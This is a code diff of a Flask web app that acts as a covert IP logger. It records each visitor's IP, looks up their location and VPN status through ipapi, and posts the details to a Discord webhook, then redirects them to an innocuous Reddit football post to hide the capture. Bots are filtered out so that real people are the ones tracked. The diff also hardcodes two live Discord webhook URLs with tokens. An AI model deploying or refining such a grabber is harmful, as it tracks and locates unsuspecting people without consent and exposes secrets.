@@ -6,14 +6,9 @@ import time
 
 app = Flask(__name__)
 
-# Discord webhook
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"
-
-# Reddit redirect URL
+# ===================== CONFIG =====================
+DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
 REDDIT_URL = "https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/"
-
-# In-memory store for unique IPs per day
-logged_ips_today = set()
 
 # Cloud / VPN detection keywords
 CLOUD_PROVIDERS = ["Amazon", "AWS", "Google Cloud", "DigitalOcean", "Hetzner", "Microsoft", "Azure", "Linode", "OVH"]
@@ -21,8 +16,12 @@ CLOUD_PROVIDERS = ["Amazon", "AWS", "Google Cloud", "DigitalOcean", "Hetzner", "
 # Common bot keywords
 BOT_KEYWORDS = ["bot", "crawl", "spider", "wget", "curl", "python-requests"]
 
+# Store unique IPs per day
+logged_ips_today = set()
+# ==================================================
+
 def get_real_ip():
-    """Extract real client IP from headers or fallback."""
+    """Extract the visitor's real IP from headers or fallback to remote_addr."""
     for header in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP"]:
         ip = request.headers.get(header)
         if ip:
@@ -34,15 +33,15 @@ def is_bot(user_agent: str) -> bool:
     return any(k in ua for k in BOT_KEYWORDS)
 
 def get_visitor_info(ip, user_agent):
-    """Query ipapi for the exact IP and collect all info."""
+    """Query ipapi for the visitor IP and collect full location info."""
     details = {}
     url = f"https://ipapi.co/{ip}/json/"
 
     try:
         resp = requests.get(url, timeout=6)
-        payload = resp.json() if resp.status_code == 200 else {}
-        details = payload
-        print(f"[DEBUG] ipapi response for {ip}: {payload}")
+        if resp.status_code == 200:
+            details = resp.json()
+        print(f"[DEBUG] ipapi response for {ip}: {details}")
     except Exception as e:
         print(f"[ERROR] ipapi request failed for IP {ip}: {e}")
 
@@ -67,7 +66,7 @@ def get_visitor_info(ip, user_agent):
     }
 
 def send_to_discord(info, retries=3, delay=2):
-    """Send Discord webhook with retry and debug."""
+    """Send visitor info to Discord webhook with retry and debug."""
     vpn_text = "Yes 🚨" if info['vpn'] else "No ✅"
     embed_color = 16711680 if info['vpn'] else 7506394  # red for VPN, teal otherwise
 
@@ -93,7 +92,7 @@ def send_to_discord(info, retries=3, delay=2):
             resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=6)
             print(f"[INFO] Discord webhook attempt {attempt}: status {resp.status_code}, response: {resp.text}")
             if 200 <= resp.status_code < 300:
-                break  # Success
+                break
         except Exception as e:
             print(f"[ERROR] Discord webhook attempt {attempt} failed: {e}")
         if attempt < retries:
@@ -112,7 +111,7 @@ def index():
     if ip in logged_ips_today:
         return redirect(REDDIT_URL)
 
-    # Only one webhook per visitor
+    # Get visitor info and send webhook
     info = get_visitor_info(ip, user_agent)
     logged_ips_today.add(ip)
     send_to_discord(info)
